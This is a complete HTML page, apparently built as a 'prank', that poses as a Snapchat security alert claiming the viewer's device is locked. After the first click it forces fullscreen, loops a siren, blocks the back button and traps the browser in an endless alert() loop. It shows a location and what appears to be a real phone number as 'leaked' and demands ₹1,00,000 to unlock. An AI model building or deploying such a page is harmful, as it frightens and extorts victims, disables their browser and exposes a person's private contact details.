<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>⚠️ System Alert</title>
  <style>
    html, body {
      margin:0; padding:0; height:100%;
      background:black; color:red;
      font-family: monospace;
      text-align:center;
      overflow:hidden; user-select:none;
    }
    #overlay {
      position:fixed; top:0; left:0; right:0; bottom:0;
      background:black; color:red;
      display:flex; justify-content:center; align-items:center;
      font-size:2rem; cursor:pointer; z-index:9999;
    }
    .container {
      padding:10vh 5vw;
      display:none; flex-direction:column;
      justify-content:center; height:100%;
    }
    h1 { font-size:2.5rem; margin-bottom:1rem; animation: blink 1s infinite; }
    p { font-size:1.3rem; margin:0.7rem 0; }
    .warning { font-size:1.6rem; margin-top:3rem; font-weight:bold; }
    @keyframes blink {
      0%, 100% { color:red; }
      50% { color:white; }
    }
  </style>
</head>
<body>
  <div id="overlay">⚠️ Click anywhere to continue ⚠️</div>
  <div class="container" id="prank-content">
    <h1>⚠️ YOUR DEVICE HAS BEEN LOCKED ⚠️</h1>
    <p>Snap Security detected:</p>
    <p><strong>Location leaked:</strong> Kolhapur, MH</p>
    <p><strong>Phone no. exposed:</strong> 8669607679</p>
    <p><strong>IP traced</strong></p>
    <p class="warning">
      Send ₹1,00,000 to unlock.<br/>
      Otherwise, Snapchat account & phone access will be wiped.
    </p>
  </div>
  <audio id="siren" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" loop></audio>

  <script>
    const overlay = document.getElementById('overlay');
    const prankContent = document.getElementById('prank-content');
    const siren = document.getElementById('siren');

    function goFullscreen() {
      const el = document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    function startPrank() {
      overlay.style.display = 'none';
      prankContent.style.display = 'flex';
      goFullscreen();
      siren.play();

      history.pushState(null, null, location.href);
      window.onpopstate = () => history.go(1);

      setTimeout(() => {
        while (true) {
          alert("⚠️ SECURITY ALERT\nSnapchat breach detected.\nYour session is locked.\nRestart Chrome to fix.");
        }
      }, 1500);
    }

    overlay.addEventListener('click', startPrank);
  </script>
</body>
</html>
